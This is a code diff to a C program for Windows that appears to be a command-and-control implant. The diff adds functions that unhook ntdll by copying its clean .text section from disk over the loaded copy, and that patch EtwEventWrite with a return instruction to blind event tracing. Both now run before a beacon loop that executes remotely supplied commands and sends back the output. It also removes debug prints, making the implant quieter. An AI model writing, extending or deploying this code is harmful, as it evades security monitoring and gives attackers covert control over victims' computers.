@@ -5,6 +5,84 @@
 #include <time.h>
 #pragma comment(lib, "wininet.lib")
 
+typedef struct
+{
+    DWORD   Length;
+    DWORD   MaximumLength;
+    PVOID   Buffer;
+} USTRING;
+
+void unhookNtdll()
+{
+    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+if (hFile == INVALID_HANDLE_VALUE)
+{
+    return;
+}
+HANDLE hFileMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+if (hFileMap == NULL) 
+{
+    return;
+}
+LPVOID hMapView = MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 0);
+if (hMapView == NULL) 
+{
+    return;
+}
+    
+
+HMODULE hNtdll = LoadLibraryA("ntdll.dll");
+
+
+//start reading the disk copy's PE structure
+PIMAGE_DOS_HEADER pDiskDosHeaders = (PIMAGE_DOS_HEADER)hMapView;
+// ntdll DOS Header
+PIMAGE_DOS_HEADER pMemDosHeaders = (PIMAGE_DOS_HEADER)hNtdll;
+
+PIMAGE_NT_HEADERS pDiskNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMapView + pDiskDosHeaders->e_lfanew);
+PIMAGE_NT_HEADERS pMemNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pMemDosHeaders->e_lfanew);
+
+PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pDiskNtHeaders);
+
+for (int i = 0; i < pDiskNtHeaders->FileHeader.NumberOfSections; i++)
+{
+  if (strcmp(pSection[i].Name, ".text") == 0)
+  { 
+    DWORD textVA = pSection[i].VirtualAddress;
+    DWORD textSize = pSection[i].SizeOfRawData;
+    
+    //Calculate actual .text addresses in both hMapView and hNtdll
+
+    LPVOID pDiskText = (LPVOID)((BYTE*)hMapView + textVA);
+    LPVOID pMemText = (LPVOID)((BYTE*)hNtdll + textVA);
+
+    DWORD oldProtect;
+    VirtualProtect(pMemText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(pMemText, pDiskText, textSize); 
+    VirtualProtect(pMemText, textSize, oldProtect, &oldProtect);
+  }
+    
+    
+}
+}
+
+void patchETW() 
+{
+    //ret ; return immediately
+    unsigned char patch[] = {0xC3}; //0xC3 = ret; return
+    HMODULE ntdll = LoadLibraryA("ntdll.dll");
+    FARPROC pEtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
+
+    DWORD oldProtect;
+    VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(pEtwEventWrite, patch, sizeof(patch)); //Makes ETW blind
+    
+    //Fixes permissions so they don't look weird
+    VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READ, &oldProtect);
+
+}
+
+
 
 HINTERNET hInternet;
 HINTERNET hConnect;
@@ -87,7 +165,6 @@ int beacon() {
         strncat(response, buffer, bytesRead);
     } while (bytesRead > 0);
 
-    printf("%s", response);
 
     if (strncmp(response, cmd_sleep, strlen(cmd_sleep)) != 0) {
         char* result = executeCommand(response);
@@ -157,12 +234,11 @@ void sendOutput(char* output) {
 int main() {
     srand(time(NULL));
     generateID();
-    printf("%s", executeCommand("whoami \n"));
+    unhookNtdll();
+    patchETW();
 
     while (1) {
         beacon();
-        printf(" Sleep for random milliseconds.\n");
         Sleep(5000 + rand() % 10000);
-        printf("Slept for random milliseconds.\n");
     }
 }
